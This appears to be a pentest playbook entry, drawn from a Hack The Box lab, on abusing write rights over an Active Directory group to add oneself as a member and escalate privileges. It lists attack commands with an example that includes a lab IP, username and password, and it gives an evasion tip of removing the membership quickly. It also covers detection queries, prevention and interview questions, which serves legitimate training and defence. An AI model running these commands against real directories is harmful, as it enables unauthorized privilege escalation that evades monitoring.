name: GenericAll / GenericWrite on a Group (Add Member)
description: With GenericAll, GenericWrite, WriteProperty (member), or AddMember over a group, add a principal you control to that group to inherit its rights. Re-authenticate afterward so the new group membership appears in your Kerberos ticket. Common privilege-escalation edge in BloodHound.
source: HTB Fluffy engagement; BloodHound ACL abuse
notes:
=== THE EDGE ===
BloodHound shows GenericAll / GenericWrite / AddSelf / WriteProperty(member) from a
principal you control to a group. Adding a member is the simplest abuse.

=== RE-AUTH IS REQUIRED ===
Group membership is baked into your Kerberos TGT at logon. After adding yourself you
MUST get a fresh ticket for the new membership to take effect:
  - Linux: request a new TGT (getTGT.py) or re-run the tool with fresh creds.
  - Windows: log off/on, or klist purge then request a new ticket.

=== TOOLING OPTIONS ===
  bloodyAD:  add groupMember "<target_group>" <user>
  net rpc:   net rpc group addmem "<target_group>" <user> -U '<domain>/<user>%<password>' -S <dc_ip>
  PowerView: Add-DomainGroupMember -Identity '<target_group>' -Members <user>
  AD module: Add-ADGroupMember -Identity '<target_group>' -Members <user>

=== CLEANUP ===
Remove yourself when done: bloodyAD ... remove groupMember "<target_group>" <user>

examples.label: bloodyAD - add self to a group
examples.command: bloodyAD --host 10.129.65.243 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' add groupMember "Service Account Managers" j.fleischman

recommended.note: The group may grant write over accounts - then use Shadow Credentials.
If the group grants reset rights over a user, force-change its password.

defense.why_it_works: The attacker holds an ACE (GenericAll/GenericWrite/WriteProperty member/Self-AddMember) over a group object, so the DC permits them to write the group's member attribute and add an arbitrary principal, inheriting the group's access.
defense.prerequisites: Write access to a group's membership (from an over-permissive ACL or nested ownership) and the ability to re-authenticate for a fresh ticket.
defense.impact: Privilege escalation to whatever the target group grants (data access, further ACLs, or Tier-0 membership).
defense.detection: [MITRE T1098] Event 4728 (member added to a global security group), 4732 (local), or 4756 (universal); Event 5136 modifying the group's member attribute; correlate with an actor who is not a normal group administrator.
defense.artifacts: 4728/4732/4756 group-membership-change events; 5136 on the group's member attribute; the transient membership if cleaned up.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" (EventCode=4728 OR EventCode=4732 OR EventCode=4756)
| table _time, SubjectUserName, MemberName, TargetUserName, GroupName
| sort - _time

index=wineventlog sourcetype="WinEventLog:Security" EventCode=5136 AttributeLDAPDisplayName="member"
| table _time, SubjectUserName, ObjectDN, OperationType
defense.sentinel_kql:
SecurityEvent
| where EventID in (4728, 4732, 4756)
| project TimeGenerated, Actor=SubjectUserName, MemberAdded=MemberName, Group=TargetUserName
| sort by TimeGenerated desc
defense.prevention: Review and minimize ACLs on privileged groups (remove GenericAll/GenericWrite held by non-admins); alert on membership changes to sensitive groups (4728/4732/4756); use Protected Users / tiered admin; enable directory-service auditing for the member attribute.
defense.evasion: Add then quickly remove the membership after use to shorten the window; target a low-visibility group rather than Domain Admins directly.
defense.misconfiguration: Non-administrative or service principals hold write access over group membership (GenericAll/GenericWrite/WriteProperty member), often from legacy delegation or nested group ownership.
defense.secure_config:
# Remove the excessive ACE from the group (example with dsacls):
dsacls "CN=<target_group>,OU=Groups,DC=<domain>" /R "<domain>\<over_privileged_principal>"
# Then monitor 4728/4732/4756 on sensitive groups and require change control for membership.

interview.q: You have GenericAll over a group in BloodHound. How do you abuse it and what is the gotcha?
interview.a: Add a principal you control to the group (bloodyAD add groupMember, net rpc group addmem, or Add-DomainGroupMember). The gotcha is that group membership lives in your Kerberos ticket, so you must re-authenticate (new TGT / logoff-logon) before the new rights take effect.

interview.q: Which Windows events reveal this, and how would you separate malicious from routine changes?
interview.a: 4728/4732/4756 (member added to a security group) and 5136 on the member attribute. Separate malicious from routine by the actor (not a normal group admin), timing, and correlation with prior recon or a fresh logon by the added principal.

explain:
Adds a principal you control into a group you have GenericAll/GenericWrite/AddMember over, inheriting the group's rights:
  --host <dc_ip>            the Domain Controller
  -d <domain>              the domain
  -u <user> -p <password>  authenticate as the account holding the write right
  add groupMember "<target_group>" <user>   put <user> into <target_group>
Re-authenticate (new ticket) afterward so the added membership appears in your Kerberos PAC and the inherited privileges take effect.
